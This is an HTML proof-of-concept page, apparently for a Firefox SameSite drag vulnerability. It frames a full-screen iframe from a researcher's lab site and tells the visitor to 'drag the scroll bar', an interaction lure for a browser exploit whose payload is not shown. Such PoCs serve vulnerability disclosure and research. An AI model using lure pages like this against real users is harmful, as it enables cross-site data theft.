<!DOCTYPE html>
<html>
	<head>
		<meta charset="utf-8">
		<meta name="viewport" content="width=device-width, initial-scale=1">
		<title>PoC</title>
		<style>
			* {
			    margin: 0;
           		padding: 0;
			}

			iframe {
			    display: white;
			    background: #000;
			    border: none;
			    height: 100vh;
			    width: 100vw;
			    position:  absolute;
			}

	       	.text {
	        	margin-top: 5%;
	        	margin-left: 30%;
	        	position: fixed;
	        }
		</style>
		<script>
			onmessage = (e) => {
				if (e.data.action === "delete") {
					iframe.remove();
				}
			}
		</script>
	</head>
	<body>
		<div class="text">
			<center>
				<h1>Scroll the page by dragging the scroll bar!</h1>
			</center>
		</div>
		<iframe id="iframe" src="https://lbherrera.github.io/lab/firefox/samesite-drag-366791/iframe.html"></iframe>
	</body>
</html>
